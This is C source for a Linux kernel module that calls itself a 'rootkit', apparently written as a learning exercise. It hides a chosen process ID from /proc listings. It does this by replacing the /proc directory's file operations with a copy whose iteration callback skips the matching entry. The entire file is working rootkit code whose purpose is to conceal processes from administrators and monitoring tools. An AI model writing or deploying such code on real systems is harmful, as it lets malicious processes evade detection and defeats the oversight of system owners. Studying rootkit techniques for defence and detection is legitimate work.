#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/proc_fs.h>

MODULE_DESCRIPTION("Module \"rootkit\" dentry vfs");
MODULE_AUTHOR("Adrian SATIN");
MODULE_LICENSE("GPL");

static char *pid_hide;
module_param(pid_hide, charp, 0660);
MODULE_PARM_DESC(pid_hide, "Pid to hide");

struct file *file_proc = NULL;

struct file_operations my_fo;

//int (*old_iterate)(struct file *fp, struct dir_context *ctx) = NULL;
struct file_operations *old_fops;

int (*old_actor)(struct dir_context *ctx, const char *name, int nlen,
		 loff_t off, u64 ino,
		 unsigned x) = NULL; // TODO this is a problem when concurrent

int my_actor(struct dir_context *ctx, const char *name, int nlen, loff_t off,
	     u64 ino, unsigned x)
{
	if (strcmp(name, pid_hide) ==
	    0) { // Test si l'entry dans /proc correspond à notre PID
		return 0;
	} else {
		return old_actor(ctx, name, nlen, off, ino, x);
	}
}

int my_iterate(struct file *fp, struct dir_context *ctx)
{
	int bk;
	old_actor = ctx->actor; // Sauvegarde de l'actor
	ctx->actor = my_actor; // Remplacement par notre actor perso
	bk = old_fops->iterate_shared(fp, ctx); // Appel de la fonction initiale
	ctx->actor = old_actor; // Remise de l'actor
	return bk;
}

static int __init hello_init(void)
{
	file_proc = filp_open("/proc/", O_RDONLY, 0);
	if (file_proc != NULL) {
		old_fops = file_proc->f_inode->i_fop;
		memcpy(&my_fo, file_proc->f_inode->i_fop,
		       sizeof(struct file_operations));
		pr_warn("%p beford %p (from old_fops)\n", my_fo.iterate_shared,
			file_proc->f_inode->i_fop->iterate_shared);
		my_fo.iterate_shared = my_iterate;
		pr_warn("%p middle %p (from old_fops)\n", my_fo.iterate_shared,
			file_proc->f_inode->i_fop->iterate_shared);
		file_proc->f_inode->i_fop = &my_fo;
		pr_warn("%p after %p (from old_fops) require %p\n",
			my_fo.iterate_shared,
			file_proc->f_inode->i_fop->iterate_shared, my_iterate);
	} else {
		pr_warn("Fail to find /proc\n");
	}
	return 0;
}
module_init(hello_init);

static void __exit hello_exit(void)
{
	pr_info("Goodbye, cruel world\n");
	file_proc->f_inode->i_fop = old_fops;
}
module_exit(hello_exit);

